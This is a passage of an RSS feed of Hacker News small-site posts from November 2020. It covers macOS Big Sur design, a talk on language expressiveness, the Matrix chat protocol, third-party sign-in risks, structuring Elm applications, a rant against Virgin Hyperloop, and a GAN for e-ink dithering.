<h2 id="takeaways">Takeaways</h2>
<p>Overall, the UI changes in macOS aren’t as dramatic as I was expecting. Big Sur’s new UI feels like a largely incremental set of changes to make macOS feel more coherent with iOS and iPad OS. Even if there are a few teething issues and the look is a little jarring at first, this has to be a good thing in the long-term.</p>
<p>Having said that, Apple still has a vast amount of work to do to perfect the new macOS UI. It unsurprising as this is the first developer beta, but there are still many rough edges.</p>
<p>I hope in the long term they focus on creating consistent patterns: for example for the first launch experience of apps. Right now there are several different layouts and approaches to this UI. I also hope Apple don’t leave pro users behind. Right now some of the less frequently used UI elements such as status bars and path bars look a little unloved. They don’t feel well integrated into the UI and in some cases lack visual separation.</p>
<p>If you’re interested in reading even more about the design changes in macOS Big Sur, Cult of Mac have <a href="https://www.cultofmac.com/715717/fantastic-fugly-all-new-app-icons-macos-big-sur/" target="_blank">a comprehensive overview of the new icons</a>.</p>
</div>
</article></div>]]>
            </description>
            <link>https://www.andrewdenty.com/blog/2020/07/01/a-visual-comparison-of-macos-catalina-and-big-sur.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25091739</guid>
            <pubDate>Sat, 14 Nov 2020 11:48:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On the expressive power of programming languages (2019)]]>
            </title>
            <description>
<![CDATA[
Score 190 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25091705">thread link</a>) | @fanf2
<br/>
November 14, 2020 | https://pwlconf.org/2019/shriram-krishnamurthi/ | <a href="https://web.archive.org/web/*/https://pwlconf.org/2019/shriram-krishnamurthi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main">
      


<div>
  <header>
    
    <h2>
      Brown University
    </h2>
    <img src="https://pwlconf.org/images/2019/shriram-krishnamurthi.jpg" alt="photo of Shriram Krishnamurthi">
  </header>
  <div>
    <h2>On the Expressive Power of Programming Languages</h2>
    <div>
      <p>
        <iframe src="https://www.youtube.com/embed/43XaZEn2aLc" frameborder="0" allow="accelerometer; encrypted-media; gyroscope" allowfullscreen=""></iframe>
      </p>
    </div>

    <p>
      Papers are like poems. Some are dazzling, some are pedestrian, some are insightful, and some reward long periods of quiet contemplation. They stir up an emotional reaction that goes beyond the strictly rational, and can often be deeply personal.</p>

    <p>
      In graduate school, during a period of identity crisis, I came across <a href="https://felleisen.org/matthias/">Matthias Felleisen's</a> “<a href="https://www.sciencedirect.com/science/article/pii/016764239190036W">On the Expressive Power of Programming Languages</a>”. At a time when the world was ruled by C++, I had immersed myself in Scheme, so I always looked skeptically at mainstream linguistic claims. However, the language wars seemed beyond rational discourse. So the idea that someone could take a concept as nebulous as “expressiveness&amp;rdquo and formalize it was already a revelation. But the beauty of this paper goes well beyond that: it also lies in the cleanliness of the approach, the correspondence of the formalism to intuition, and the tautness of its execution.</p>

    <p>
      It was the most stunning paper I had ever read, and remains so. It's like the poem that never leaves your soul.</p>

    <p>
      Unfortunately, this paper may not be easy to read for the uninitiated: it depends on a certain amount of “cultural knowledge” of programming language theory. I hope to peel off some of those layers and help you, too, understand the paper — hopefully while preserving the joy and beauty I experienced.</p>
    
    <p>
      Shriram is the Vice President for Programming Languages at Brown University in Providence, RI, USA. He’s not, really, but that’s what it says on his business card. At heart, he's a person of ill-repute: a <a href="https://schemers.org/">Schemer</a>, <a href="https://racket-lang.org/">Racketeer</a>, and <a href="https://www.pyret.org/">Pyreteer</a>. He believes tropical fruit are superior to all other kinds. He is terrified of success, because he may be forced to buy a suit. He is known to interrogate his audiences to ensure they’re paying attention. <strong>So, be alert. You can read email later.</strong>
    </p>
    <ul>
      <li>
        <strong>Twitter:</strong>
        <a href="https://twitter.com/ShriramKMurthi">
          @ShriramKMurthi
        </a>
      </li>
      <li>
        <strong>Site:</strong>
        <a href="https://cs.brown.edu/~sk/">
          https://cs.brown.edu/~sk/
        </a>
      </li>
      <li>
        <strong>DBLP:</strong>
        <a href="https://dblp.uni-trier.de/pers/hd/k/Krishnamurthi:Shriram">
          https://dblp.uni-trier.de/pers/hd/k/Krishnamurthi:Shriram
        </a>
      </li>
    </ul>
  </div>
</div>

      

    </div></div>]]>
            </description>
            <link>https://pwlconf.org/2019/shriram-krishnamurthi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25091705</guid>
            <pubDate>Sat, 14 Nov 2020 11:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Matrix to replace proprietary and centralized chat apps]]>
            </title>
            <description>
<![CDATA[
Score 280 | Comments 179 (<a href="https://news.ycombinator.com/item?id=25091614">thread link</a>) | @jaemoe
<br/>
November 14, 2020 | https://jae.moe/blog/2020/11/using-matrix-to-replace-proprietary-and-centralized-chat-apps/ | <a href="https://web.archive.org/web/*/https://jae.moe/blog/2020/11/using-matrix-to-replace-proprietary-and-centralized-chat-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <h4>Using Matrix to replace proprietary and centralized chat apps</h4><p>
            Reading time: 3 minutes.
            </p><p>As you may know it, I am a fervent user of the chat protocol Matrix.
If you don’t know what Matrix is, this is basically a protocol developed by the Matrix Foundation. Matrix is made to be federated, it means that servers implementing correctly the Matrix specification can communicate and therefore, users that are not on the same servers can still talk to each other. Some examples of federation would be with Activitypub (Mastodon) or Usenet.</p>
<blockquote>
<p>But wait Jae, we already have countless other chat apps already, Telegram, Signal and even XMPP which is federated!</p>
</blockquote>
<p>Well, here are the advantages of Matrix over all of those:</p>
<ol>
<li>
<p>Matrix is 100% open-source. As you may know Telegram’s servers are currently closed-source which poses a problem about trust. Nobody can say what the server is doing nor what it is harvesting which could be very dangerous. On the other hand, Signal, XMPP and Matrix are all fully open-source.</p>
</li>
<li>
<p>Matrix isn’t centralized to a single server. Currently, Telegram and Signal are centralized apps which means if the server goes down, everyone else goes down. moxie0 of Signal even wrote a <a href="https://signal.org/blog/the-ecosystem-is-moving/">blog post</a> on ‘why Signal will never have federation’ which is in my opinion a big mistake. XMPP still stands up as it is federated as well and has plenty of server implementations.</p>
</li>
<li>
<p>Matrix has a flagship client which has a great UX. <strong>This</strong> is a big point, as other federated protocols such as XMPP are kinda like a jungle for new users, you are greeted with a list of all clients which you can use and then comes the step where you have to choose your server. Lots of those servers are sometime hard to find, have very spartan UIs or even no web form or easy way to register whatsoever. On the other hand, Matrix has a flagship, <strong>Element</strong>, which is deemed as the ‘official Matrix client’ since it implements the Matrix specification correctly and is made by basically the same people. While other projects would have only done a server, Element made a polished client, focused mainly on the UX in order for people to take the first steps of moving to anything else easier. Even if the UX is still not perfect and some aspects aren’t finished yet, moving to Element will be easier than moving to any other XMPP client.</p>
</li>
</ol>
<p>I have been using Matrix since 2016 now and it has considerably improved over time, coming from “barely usable” to “let’s host my own homeserver”.
Even in its current state, lots of things are to be improved such as communities or custom stickers but everything is on the right way.
From now on, everything can <strong>only improve</strong>, we are seeing new server implementations, new clients, bots, communities moving to Matrix.</p>
<p>Matrix has several other features such as E2EE (end-to-end encryption) which is now enabled by default and bridges which can be used to temporarily bridge a Matrix room and a slack chat for instance.</p>
<p>If you want to give Matrix a try, download <a href="https://element.io/">Element</a> and create an account, it doesn’t even requires an email address!
You can also come and say ‘hello’ in my very own channel <strong>#home:jae.moe</strong> !</p>
<p>That’s all for today,
I’ll see you next time!
If you like my content, <a href="https://jae.moe/blog/index.xml">don’t forget to subscribe through RSS</a>!</p>

            
                <p><a href="https://news.ycombinator.com/item?id=25091614">Talk about it on Hacker News!</a>
            
        </p></div></div>]]>
            </description>
            <link>https://jae.moe/blog/2020/11/using-matrix-to-replace-proprietary-and-centralized-chat-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25091614</guid>
            <pubDate>Sat, 14 Nov 2020 11:28:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't use third party auth to sign in]]>
            </title>
            <description>
<![CDATA[
Score 807 | Comments 501 (<a href="https://news.ycombinator.com/item?id=25091420">thread link</a>) | @gurjeet
<br/>
November 14, 2020 | https://gurjeet.singh.im/blog/never-use-google-to-sign-in | <a href="https://web.archive.org/web/*/https://gurjeet.singh.im/blog/never-use-google-to-sign-in">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>If a website offers you to sign-in using Google (or any third-party service, say
Facebook, Github, etc.), don’t use that feature.</p>

<p>The long and short of it is that if Google (or third-party of your choice) locks
your account for some reason, you will be locked out of <em>all</em> the services where
you signed into using Google. There’s no shortage of examples where people have
been locked out of Google (and other services), with no recourse to re-enable
their accounts, and consequently losing all data hosted or protected by that
Google account.</p>

<p>Every respectable service allows you to create accounts using your email
address, so please use that method to create your accounts.</p>


  </div>
  
  
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://gurjeet.singh.im/blog/never-use-google-to-sign-in</link>
            <guid isPermaLink="false">hacker-news-small-sites-25091420</guid>
            <pubDate>Sat, 14 Nov 2020 10:38:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I write Elm applications]]>
            </title>
            <description>
<![CDATA[
Score 103 | Comments 83 (<a href="https://news.ycombinator.com/item?id=25091132">thread link</a>) | @galfarragem
<br/>
November 14, 2020 | https://jezenthomas.com/how-i-write-elm-applications/ | <a href="https://web.archive.org/web/*/https://jezenthomas.com/how-i-write-elm-applications/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
    <p>
      <span>November  7, 2020</span>
      
      | Gdańsk, Poland
      
    </p>
    <p>Most of my work over the past 10 years has involved writing what is often called a <em>wizard</em>.</p>
<p>A wizard is essentially a multi-step process that guides a user through a particular workflow. For example, if you are installing a new application on your computer, the wizard might guide you through the following process:</p>
<ol type="1">
<li>Enter your license registration details</li>
<li>Agree to the software author’s legal terms</li>
<li>Specify an installation location</li>
</ol>
<p>Most web applications provide something similar. If a user needs to input a large amount of data for the application to then run a bunch of calculations, you could of course just provide the user with one big web form. At a certain size though, a single web form can be intimidating and provide a less than ideal user experience. The canonical way to improve the user experience here is to break up the web form into several separate pages. This is another example of a wizard.</p>
<figure>
<img src="https://jezenthomas.com/static/img/wizard-diagram.jpg" alt="Forms are easier to digest when they’re split into separate steps"><figcaption>Forms are easier to digest when they’re split into separate steps</figcaption>
</figure>
<p>I’ve tried writing wizards in a number of different web technologies, and so far Elm has proven itself as by far the most robust and painless, <em>especially</em> when it inevitably comes to changing some conditional logic to meet the mutable needs of various business processes.</p>
<p>For any small Elm application, project structure is easy. There is no reason why a 1,000 line Elm application can’t live in a single file. In fact this is really how every Elm application ought to begin its life. Start with a single file with the usual boilerplate and the following contents:</p>
<ul>
<li>A single sum type to model all of the messages your application supports</li>
<li>A single model which contains all the application state</li>
<li>A single update function for advancing the application state</li>
<li>A single view function for rendering the application state on the page</li>
</ul>
<p>If your web form is complex enough to warrant being broken into separate pages however, then your application is naturally not going to consist of a small number of lines of code. A common concern among less experienced Elm programmers is that one big sum type for all of your messages becomes unwieldy to maintain. The same is said of having one big shallow record for all of the application state, or one big <code>update</code> function to match all the constructors of the one big <code>Msg</code> type. This is where unnecessary complexity starts to balloon as programmers add <em>clever</em> abstractions and misdirections, usually involving both <code>Html.map</code> and <code>Cmd.map</code>, separate <code>update</code> functions for each logical subsection of your application (usually with noticeably awkward type signatures), and some vague hand-waving in the direction of <em>encapsulation</em> and so-called <em>Clean Code</em>.</p>
<p>I’d argue that this kind of misdirection is almost <em>never</em> what you want. I’d argue further that this applies <em>especially</em> to you if your background is in maintaining complex React/Angular applications, where invented complexity is the status quo and this kind of misdirection is simply what you have become desensitised to.</p>
<p>So if the combination of <code>Html.map</code> and <code>Cmd.map</code> are to be avoided, how can we scale an Elm application without sacrificing developer ergonomics? In short, the tricks to employ are:</p>
<ul>
<li>Nested sum types</li>
<li>Nested record types</li>
<li>Nested update functions</li>
<li>Small, composable view functions</li>
<li>Function composition</li>
<li>Lenses</li>
</ul>
<p>Let’s take a look at a more concrete application of these ideas. As an example, we can model the process of a person applying for a bank loan.</p>
<p>The bank will want to ask the applicant a whole bunch of questions, which we could group into three categories:</p>
<ol type="1">
<li>Personal information</li>
<li>Details on the purpose of the loan</li>
<li>Financial information and creditworthiness</li>
</ol>
<p>This would suggest a three-step wizard or a three-page web form. A reasonable place to begin splitting our application apart into three smaller pieces is in our <code>Msg</code> type.</p>
<h2 id="the-big-msg-type">The Big Msg Type</h2>
<p>The naïve way to model the messages our application should support is with one big sum type, which might look something like this:</p>
<pre><code>type Page
  = PersonalInformationPage
  | LoanPurposePage
  | FinancialDetailsPage

type Msg
  -- System-wide messages
  = NoOp
  | SetPage Page
  -- etc…

  -- Personal information
  | SetFirstName String
  | SetLastName String
  | SetAddressLine1 String
  -- …more messages for the personal information page

  -- Purpose of the loan
  | SetPurchaseItemCategory
  | SetPurchaseItemEstimatedValue
  -- …more messages for the loan purpose page

  -- Financial information
  | SetMonthlyIncomeBeforeTax
  | SetMonthlyRentPayment
  -- …more messages about the applicant's financial details</code></pre>
<p>This <em>does</em> work, but at some point it becomes cumbersome to support a large number of constructors. The value for “large” is of course determined by the individual programmer’s personal taste and/or pain threshold. To ease this pain, people typically <em>extract</em> groups of messages into their own separate sum types, which subsequently forces them to write update functions that return a type <em>other</em> than the top-level <code>Msg</code> type.</p>
<p><em>Don’t do that!</em></p>
<p>The way to break these groups of constructors out is by first nesting them inside the <code>Msg</code> type, like this:</p>
<pre><code>type PersonalInformationMsg
  = SetFirstName String
  | SetLastName String
  | SetAddressLine1 String
  -- etc..

type LoanPurposeMsg -- etc…

type FinancialDetailsMsg -- etc…

type Msg
  = NoOp
  | SetPage Page
  | PersonalInformationMsg PersonalInformationMsg
  | LoanPurposeMsg LoanPurposeMsg
  | FinancialDetailsMsg FinancialDetailsMsg</code></pre>
<p>The new message types can live in the same file as the top-level <code>Msg</code> type. They can also be extracted to different files. That’s your choice.</p>
<p>The next thing to tackle is our <code>update</code> function, since it needs to mirror our <code>Msg</code> type.</p>
<h2 id="nested-update-functions">Nested Update Functions</h2>
<p>I’ve seen people advocate for page-specific <code>update</code> functions which take a page-specific model and return a tuple of that page-specific model and a page-specific <code>Cmd Msg</code> equivalent. This is typically where you see <code>Cmd.map</code> sneaking in. These functions almost inevitably end up needing <em>something</em> from the top-level application-wide state, so you’ll often see some type signature like this:</p>
<pre><code>updatePersonalInformation
   : PersonalInformationMsg
  -&gt; Model
  -&gt; (PersonalInformationModel, Cmd PersonalInformationMsg)
  -&gt; (Model, Cmd Msg)</code></pre>
<p>This is <em>way</em> too complex already, and this approach doesn’t even actually buy you anything.</p>
<p>The far simpler way to do this is to have every nested <code>update</code> function take a page-specific message, the <em>entire</em> application state, and return the same type for that state along with the top-level <code>Msg</code> type, like this:</p>
<pre><code>updatePersonalInformation : PersonalInformationMsg -&gt; Model -&gt; (Model, Cmd Msg)
updatePersonalInformation msg model = case msg of
  SetFirstName a    -&gt; -- …
  SetLastName a     -&gt; -- …
  SetAddressLine1 a -&gt; -- …
  -- etc…

update : Msg -&gt; Model -&gt; (Model, Cmd Msg)
update msg model = case msg of
  NoOp -&gt; (model, Cmd.none)
  SetPage page -&gt; ({ model | page = page }, Cmd.none)
  PersonalInformationMsg subMsg -&gt; updatePersonalInformation subMsg model
  LoanPurposeMsg subMsg -&gt; updateLoanPurpose subMsg model
  FinancialDetailsMsg subMsg -&gt; updateFinancialDetails subMsg model</code></pre>
<p>No complicated type signatures. No juggling of message types. No <code>Cmd.map</code>. Easy.</p>
<p>Of course the whole point of our <code>update</code> function is to advance the state of our model, and the structure of that model is also something that can swell and become unwieldy, so that’s what we will dissect next.</p>
<h2 id="record-surgery">Record Surgery</h2>
<p>Near the inception of the project, all of our individual bits of state might exist at the top level of our <code>Model</code>, which is typically represented as a record. Perhaps something like this:</p>
<pre><code>type alias Model =
  { page : Page
  , firstName : String
  , lastName : String
  , addressLine1 : String
  -- …more personal information fields

  , purchaseItemCategory : ItemCategory
  , purchaseItemEstimatedValue : Money
  -- …more loan purpose fields…

  -- …and also financial details, and system-wide state, etc…
  }</code></pre>
<p>Like the parts of our project we’ve addressed previously, this also can turn into a bit of a mess as it grows. Both application-wide data and page-specific data are mixed in together which feels a bit haphazard. Fortunately, grouping and extracting these fields is typically rather intuitive. We can start by grouping page-specific parts of the state together, and then group further until it no longer <em>feels</em> messy.</p>
<pre><code>type alias Address =
  { line1 : String
  , line2 : String
  , city : String
  , postcode : String
  -- …
  }

type alias PersonalInformation =
  { firstName : String
  , lastName : String
  , address : Address
  -- …
  }

type alias LoanPurpose =
  { purchaseItemCategory : ItemCategory
  , purchaseItemEstimatedValue : Money
  -- …
  }

type alias FinancialDetails = -- …

type alias Model =
  { page : Page
  , personalInformation : PersonalInformation
  , loanPurpose : LoanPurpose
  , financialDetails : FinancialDetails
  }</code></pre>
<p>The problem now however is that when we wish to update a deeply-nested field, we need to write all of the code to unwrap each level until we arrive at the depth we need. Illustrated another way, let’s say we want to update the first line of the applicant’s address.</p>
<p>Retrieving the value of this field is no problem, as we can use Elm’s dot syntax to succinctly get us all the way there, like this:</p>
<pre><code>model.personalInformation.address.line1</code></pre>
<p>What we <em>can’t</em> do here however is <em>update</em> that field in a similar fashion, <em>i.e.</em>, Elm won’t allow us to write something like this:</p>
<pre><code>-- This won't work
{ model.personalInformation.address | line1 = newLine1 }

-- This also won't work
{ model | personalInformation.address.line1 = newLine1 }</code></pre>
<p>The naïve way to unwrap and subsequently update the field in this record is to write something like this:</p>
<pre><code>updatePersonalInformation : PersonalInformationMsg -&gt; Model -&gt; (Model, Cmd Msg)
updatePersonalInformation msg model = case msg of
  SetFirstName _ -&gt; -- …

  SetLastName _ -&gt; -- …

  SetAddressLine1 newLine1 -&gt;
    let
        …</code></pre></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jezenthomas.com/how-i-write-elm-applications/">https://jezenthomas.com/how-i-write-elm-applications/</a></em></p>]]>
            </description>
            <link>https://jezenthomas.com/how-i-write-elm-applications/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25091132</guid>
            <pubDate>Sat, 14 Nov 2020 09:11:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virgin Hyperloop Has Invented the World's Crappiest High-Speed Rail]]>
            </title>
            <description>
<![CDATA[
Score 81 | Comments 116 (<a href="https://news.ycombinator.com/item?id=25090938">thread link</a>) | @Osiris30
<br/>
November 14, 2020 | https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/ | <a href="https://web.archive.org/web/*/https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico">
<p>Shocking news! In an incredible breakthrough for American mass-transit engineering, the transportation technology company Virgin Hyperloop this past weekend successfully moved two people 500 meters across the barren Las Vegas desert at a top speed of just over 100 mph, setting a new world record for the absolute most pitiful thing anyone not named “Elon Musk” has ever tried to pass off as “high-speed rail.”</p>



<p>Here’s video of the shameful display:</p>



<figure><p>
<iframe title="Watch people travel in Virgin Hyperloop for the first time" width="500" height="281" src="https://www.youtube.com/embed/AZruVz3Ccjk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Virgin Hyperloop, an American company despite the Richard Branson branding, proposes to use a combination of magnetic levitation, or “maglev”—a decades-old technology that has been in commercial operation moving real trains filled with real people in, for example, Shanghai, China, at speeds up to 268 miles per hour, for <em>17 goddamn years</em>—and “vactrain,” a concept design for an enclosed, artificially evacuated tunnel where air resistance may be as low as in the upper parts of Earth’s atmosphere, theoretically allowing for much higher top speeds at much lower levels of energy consumption. It is so goddamn embarrassing to type this. France’s electric TGV system has been in regular commercial operation for nearly 40 years; in April of 2007 one of its trains hit 357 miles per hour in a test.</p>



<p><a href="https://www.cnn.com/2020/11/08/tech/virgin-hyperloop-passengers/index.html">CNN’s article about this event</a> paraphrases a Virgin Hyperloop executive claiming that the hyperloop pods “can travel at the speed of aircraft.” Which is true, in the sense that commercial aircraft with dozens if not hundreds of people aboard do sometimes travel at 100 miles per hour, on the ground, for seconds at a time, during takeoff or landing, when they are going only a fraction as fast as they’re capable of going. It is also true in the sense that, strictly speaking, a paper airplane is a form of “aircraft,” and you can really whip some of those suckers across a room. A more accurate but perhaps less flattering claim would be that my Honda Odyssey can travel at the fastest speed Virgin Hyperloop has yet attained, and with <em>four times as many people riding in it</em>.</p>



<p>Hell, for that matter, as <a href="https://twitter.com/leftistthot420/status/1326561247333134336">a Twitter user</a> helpfully pointed out, <a href="https://en.wikipedia.org/wiki/LNER_Class_A4_4468_Mallard">a freaking <em>steam locomotive</em> hit 126 miles per hour</a> in England, 82 years ago, in 1938.</p>



<p><em>Yeah, but, when it’s done, it’ll go 600 miles per hour</em>, you’re whining, <em>and it’ll have 25 to 30 people in a pod!</em> When exactly will that be? France opened the TGV in 1981. Japan’s oldest high-speed line debuted in 1964—<em>1964!</em>—and was better and faster then than Amtrak’s Acela trains go now. Shanghai’s maglev train has been operable since John Kerry was campaigning to unseat George W. Bush as president. Measure speed by the number of riders the respective services will have moved by, say, 2050. Measure it in carbon emissions. By the year 2020, the best-funded and most sophisticated high-speed rail developer in the United States moved two (2) people 500 meters.</p>



<p>The United States is generations behind much of the rest of the wealthy, industrialized world in this area. For all but a very narrow corridor along the East Coast serviced by the weak half-a-loaf shit that passes for high-speed rail in this country, the best an American commuter can hope for in intercity rail options are crappy and ancient diesel Amtrak trains that top out at around 80 miles per hour. Most American cities simply are not serviced by any intercity rail network at all. The U.S.’s shameful mass-transit situation—and thus its shameful dependence on personal vehicles, and all the downstream bad shit that comes from that—could be improved a zillion percent by just aiming for the level of railroad sophistication French people considered normal before the median 2020 French person was old enough to ride a bicycle. And here are these Professor Frink–ass Hyperloop dinguses, dumping resources beyond counting into inventing some shit that already exists when for a fraction of the cost and in a fraction of the time they could just <em>purchase</em> or at the very least <em>copy</em> what is already working just fine even in backward-ass doofus countries like freaking Italy. It wouldn’t need test tracks! It wouldn’t need years of iteration and development! They already did all that shit, all over the rest of the world! </p>



<p>In a vacuum (a figurative one: an alternate universe in which the rest of the post-industrial world were not absolutely goddamn <em>bursting</em> with operating networks of authentic high-speed rail; where high-speed rail were not already such a well-developed form of transit that the TGV system, which routinely moves huge numbers of day-to-day commuters across large distances of France at speeds well more than twice that achieved by this sad two-person billion-dollar pod going from nowhere to nowhere across a tiny patch of worthless desert, were not both infinitely better and more sophisticated than any presently available commercial rail in the United States <em>and</em> fairly outmoded in comparison to newer [yet still not all that new!] systems in China and Japan and elsewhere) the Virgin Hyperloop could almost look like an impressive accomplishment. Alas, here in the world of context, its only real accomplishment is a promotional one. The business of the American technology sector and its attendant courtier press is to continually recreate and exploit something like a vacuum in the public’s awareness of what the larger world is like, so that clueless observers will congratulate a bunch of boobs for “inventing” a shittier, more expensive version of something that is already regarded as boring and normal—fast, energy-efficient rail service!—pretty much everywhere outside of this stupid and embarrassing country.</p>



<p>Everything about the broken incentives and hollowed-out capacities of American society is crystallized in this dumb pod moseying its way along a track to nowhere in Las Vegas. The United States has a problem: It is too dependent on inefficient, dirty, and expensive forms of transportation, because the vast majority of its people have no practical access to other kinds. Its infrastructure and the health of its communities are all jacked up by the necessity of splattering asphalt all over everything in order for people to drive their big dumb cars to, and park them near, anywhere they’d decide to go. It cannot achieve efficient levels of density or make meaningful turns toward environmental responsibility for as long as this is the case. Thankfully, a solution to this problem already exists and is in operation throughout other parts of the world with comparable levels of wealth and technological capacity: Trains! Networks of fast-moving trains that do not need internal combustion engines in order to move lots of people very quickly along their tracks! Companies and agencies make and install and operate these train systems, and have been doing so for a long time, longer even than the lifetime of the graybeard crap-bag writing this blog. They know how to do it! They can probably just be hired to do it. At some level somebody can probably just buy some of those trains, and install them, and turn them on, and take people from here to there on them.</p>



<p>But who could make it happen? Broke-dick, systematically impoverished municipalities, lashed to budget-balancing like a cinderblock tied to their feet? Close your eyes and try to imagine how a sane and obviously good decision like <em>Just import the TGV and run it between the big American cities instead of spending years and fortunes inventing maglev from scratch for no reason</em> could get made in these United States. Imagine who’d make it, and what their goals would be, and where the money would come from. It simply can’t get made on those terms. It can’t get made at all. No level of American society even has a mechanism for that anymore. If it doesn’t require a messianic assbrain with a Steve Jobs cosplay fantasy pitching some sleepy billionaire or venture capital firm on the possibility of cornering the market on a brand-new technology that will conquer the world, then it will not get done. If it merely delivers a profound benefit to the common good rather than the promise of extravagant enrichment to a shrinking class of hyper-powered parasites, then it simply cannot exist.</p>




</div></div></div></div></div>]]>
            </description>
            <link>https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090938</guid>
            <pubDate>Sat, 14 Nov 2020 08:03:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A GAN to generate dithers minimising frame difference for a slow movie player]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25090215">thread link</a>) | @fkramink
<br/>
November 13, 2020 | http://matpalm.com/blog/dithernet_vsmp/ | <a href="https://web.archive.org/web/*/http://matpalm.com/blog/dithernet_vsmp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
  
<p>it's been about two years since i first saw the awesome
   <a href="https://medium.com/s/story/very-slow-movie-player-499f76c48b62">very slow movie player</a>
   project by bryan boyer. i thought it was such an excellent idea but never got around
   to buying the hardware to make one. more recently though i've seen a couple of references
   to the project so i decided it was finally time to make one.
</p>
<p>one interesting concern about an eink very slow movie player is the screen refresh. simpler
   eink screens refresh by doing a full cycle of a screen of white or black before displaying
   the new image. i hated the idea of an ambient slow player doing this every few minutes
   as it switched frames, so i wanted to make sure i got a piece of hardware that could do
   incremental update.
</p>
<p>after a bit of shopping around i settled on a
   <a href="https://www.waveshare.com/6inch-hd-e-paper-hat.htm">6 inch HD screen from waveshare</a>
</p>
<p>it ticks all the boxes i wanted
</p>
<ul>
 <li>
     6 inch
 </li>

 <li>
     1448×1072 high definition
 </li>

 <li>
     comes with a raspberry pi HAT
 </li>

 <li>
     and, most importantly, support partial refresh
 </li>
</ul>
<p>this screen also supports grey scale, but only with a flashy full cycle redraw,
   so i'm going to stick to just black and white since it supports the partial redraw.
</p>
<p>note: even though the partial redraw is basically instant it does suffer from a ghosting problem;
   when you draw a white pixel over a black one things are fine, but if you draw black over
   white, in the partial redraw, you get a slight ghosting of gray that is present until a
   full redraw :/
</p>


<p>so how do you display an image when you can only show black and white?
   dithering! here's an example of a 384x288 RGB image dithered using
   <a href="https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.Image.convert">PILS implementation of the Floyd-Steinberg algorithm</a>
</p>
<table>
<tbody><tr><td><img src="http://matpalm.com/blog/imgs/2020/dn/eg.dither.png"></td></tr>
<tr><td>original RGB vs dithered version</td></tr>
</tbody></table>

<p>it makes intuitive sense that you could have small variations in the exact locations of the
   dots as long as you get the densities generally right. s
   so there's a reasonable question then; how do you dither in such a way that you get a
   good result, but with minimal pixel changes from a previous frame? (since we're
   motivated on these screens to change as little as possible)
</p>
<p>there are two approaches i see
</p>
<p>1) spend 30 minutes googling for a solution that no doubt someone came up with 20 years
   ago that can be implemented in 10 lines of c running at 1000fps ...
</p>
<p>2) .... or train an
   <a href="https://jax.readthedocs.io/">jax</a>
   based GAN to generate the dithers with a loss balancing a good dither vs no pixel change. :P
</p>


<p>when building a very slow movie player the most critical decision is...
   what movie to play?
   i really love the 1979 classic <a href="https://www.imdb.com/title/tt0078748/">alien</a>,
   it's such a great dark movie, so i thought i'd go with it.
   the movie is 160,000 frames so at a play back rate of a frame every 200 seconds
   it'll take just over a year to finish.
</p>
<p>note that in this type of problem there is no concern around overfitting.
   we have access to all data going in and so it's fine to overfit as much as we like;
   as long as we're minimising whatever our objective is we're good to go.
</p>


<p>i started with a
   <a href="https://arxiv.org/abs/1505.04597">unet</a>
   that maps 3 channel RGB images to a single channel dither.
</p>
<table>
<tbody><tr><td><img src="http://matpalm.com/blog/imgs/2020/dn/models.v1.png"></td></tr>
<tr><td>v1 architecture</td></tr>
</tbody></table>

<p>i tinkered a bit with the architecture but didn't spend too much time tuning it.
   for the final v3 result i ended with a pretty vanilla stack of encoders &amp; decoders
   (with skip connections connecting an encoder to the decoder at the same spatial resolution)
   each encoder/decoder block uses a residual like shortcut around a couple of convolutions.
   nearest neighbour upsampling gave a nicer result than deconvolutions in the decoder
   for the v3 result.
   also, <a href="https://arxiv.org/abs/1606.08415">gelu</a> is my new favorite activation :)
</p>
<p>for v1 i used a binary cross entropy loss of P(white) per pixel
   ( since it's what worked well for my
   <a href="http://matpalm.com/blog/counting_bees/">bee counting project</a> )
</p>
<p>as always i started by overfitting to a single example to get a baseline feel for capacity required.
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/overfit.png">
</td></tr>
<tr><td>
v1 overfit result
</td></tr>
</tbody></table>

<p>when scaling up to the full dataset i switched to training on half resolution images
   against a patch size of 128. working on half resolution consistently gave a better
   result than working with the full resolution.
</p>
<p>as expected though this model gave us the classic type of problem we see with
   straight unet style image translation; we get a reasonable sense of the shapes, but no
   fine details around the dithering.
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/v1.upsample.png">
</td></tr>
<tr><td>
v1 vanilla unet with upsampling example
</td></tr>
</tbody></table>

<p>side notes:
</p>
<ul>
 <li>
